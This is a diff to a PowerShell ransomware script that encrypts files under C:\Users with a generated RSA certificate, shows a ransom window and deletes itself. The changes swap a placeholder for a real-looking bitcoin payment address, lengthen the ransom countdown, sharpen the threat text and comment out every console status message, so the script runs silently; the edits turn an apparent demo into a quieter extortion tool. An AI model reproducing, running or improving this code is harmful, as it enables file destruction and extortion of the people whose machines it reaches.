@@ -21,8 +21,8 @@ $TargetEncr = "C:\Users"
 $CertName = "DEMO CEC"
 
 # UI  
-$btc_addr = '538f15c2-07ed-4cbe-8f37-efd0ecce1165' # Who knows perhaps I'll get rich 💰 
-$delay = 60  # Delay to show the UI 
+$btc_addr = '35uK91y1uxxrvjdD6fCdBq75QVfDtHyCq1' # Who knows perhaps I'll get rich 💰 
+$delay = 12000  # Delay to show the UI 
 
 #Set Error & Warning Action 
 $ErrorActionPreference = "Stop"
@@ -38,18 +38,18 @@ $Version = "2.3"
 ### MAIN ### 
 
 if (Test-Path -Path $TargetEncr) {
-	write-host "[+] Let the carnage begin !!! " -ForegroundColor Green
+	#write-host "[+] Let the carnage begin !!! " -ForegroundColor Green
 } 
 else {
-	write-host "[!] No data found ... exiting " -ForegroundColor Red 
+	#write-host "[!] No data found ... exiting " -ForegroundColor Red 
 	exit
 }
 
-Write-Host "[+] Prepating Directory" -ForegroundColor Green
+#Write-Host "[+] Prepating Directory" -ForegroundColor Green
 $TempDir = "c:\ProgramData\loli"#$((Get-Date).ToString('yyyy-MM-dd-HHmm'))
 New-Item -ItemType Directory -Path "$TempDir" | Out-Null 
 
-Write-Host "[+] Init Certificate ..." -ForegroundColor Green
+#Write-Host "[+] Init Certificate ..." -ForegroundColor Green
 # RSA 3072 bits RSA Key
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Generate Certificate & Export it to the Temp folder
@@ -71,7 +71,7 @@ if ($CertPrint -is [array])
 }
 $Cert = $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint)
 
-Write-Host "[+] Init Encryption ..." -ForegroundColor Green
+#Write-Host "[+] Init Encryption ..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Encrypt files via Badware 
@@ -243,7 +243,7 @@ $form.controls.add($pictureBox)
 
 $Label = New-Object System.Windows.Forms.Label
 $Label.ForeColor = "Red"
-$Label.Text = "-- You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
+$Label.Text = "-- You Got Ransomed -- !!! ++ DO NOT TURN-OFF YOUR COMPUTER OR LOSE EVERYTHING ++ !!! " 
 $Label.AutoSize = $true 
 $Label.Location = New-Object System.Drawing.Size(50,450) 
 $Font = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
@@ -251,7 +251,7 @@ $form.Font = $Font
 $Form.Controls.Add($Label) 
   
 $Label1 = New-Object System.Windows.Forms.Label 
-$Label1.Text = "Send 0.10 BTC to this account: $btc_addr" 
+$Label1.Text = "Send 0.01 BTC to this account: $btc_addr" 
 $Label1.AutoSize = $true 
 $Label1.Location = New-Object System.Drawing.Size(50,500) 
 $Font1 = New-Object System.Drawing.Font("Arial",15,[System.Drawing.FontStyle]::Bold) 
@@ -289,9 +289,9 @@ start-sleep 1
 $delay -= 1	  
 }
 $Form.Close()
-Write-Host "[+] Creating lollipop.txt on Desktop ..." -ForegroundColor Green
+#Write-Host "[+] Creating lollipop.txt on Desktop ..." -ForegroundColor Green
 
-Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
+#Write-Host "[+] Clean up the mess ..." -ForegroundColor Green
 Remove-Item -Path $MyInvocation.MyCommand.Source
 
-Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
+#Write-Host "[+] Exiting and waiting for the money" -ForegroundColor Green
